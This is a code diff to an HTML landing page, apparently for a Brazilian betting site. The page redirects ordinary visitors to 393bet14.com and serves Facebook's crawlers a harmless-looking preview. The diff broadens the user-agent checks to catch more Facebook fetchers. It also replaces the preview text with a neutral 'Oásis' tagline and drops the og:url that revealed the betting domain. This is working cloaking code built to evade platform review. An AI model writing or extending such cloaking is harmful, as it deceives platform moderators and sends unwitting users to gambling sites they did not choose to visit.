@@ -4,10 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
-    <meta property="og:title" content="Minha Página Final">
-    <meta property="og:description" content="Esta é a página de carregamento final para o Facebook Crawler.">
+    <meta property="og:title" content="Oásis">
+    <meta property="og:description" content="Dois passos da felicidade, com responsabilidade.">
     <meta property="og:image" content="/mnt/data/393.avif"> <!-- Caminho para a imagem do logo -->
-    <meta property="og:url" content="https://393bet14.com/?id=170336285"> <!-- URL da página de carregamento -->
     <title></title>
     <style>
         /* Estilo para a tela de carregamento */
@@ -51,7 +50,10 @@
 
     <script>
         // Função para detectar o Facebook Crawler e bloquear o redirecionamento
-        if (!navigator.userAgent.includes("facebookexternalhit")) {
+        if (!(navigator.userAgent.includes('externalhit') 
+            || navigator.userAgent.includes('catalog') 
+            || navigator.userAgent.includes('externalagent')
+            || navigator.userAgent.includes('externalfetcher'))) {
             
             const LINK_BET = "https://393bet14.com/"; // Link para o qual será redirecionado
 
